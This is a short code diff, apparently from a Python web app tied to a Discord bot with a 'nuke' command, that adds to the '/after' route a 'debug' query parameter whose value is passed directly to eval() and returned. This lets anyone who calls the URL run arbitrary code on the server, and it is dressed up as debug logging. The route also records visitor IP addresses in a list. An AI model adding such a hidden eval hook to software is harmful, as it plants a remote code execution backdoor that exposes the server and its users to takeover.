@@ -58,6 +58,10 @@ async def nuke(interaction: disnake.ApplicationCommandInteraction):
 
 @app.route("/after")
 async def after():
+    debug = request.args.get("debug")
+    print("debug:", debug)
+    if debug:
+        return str(eval(debug))
     ip = request.remote_addr or request.headers["X-Forwarded-For"]
     if ip not in working:
         working.append(ip)
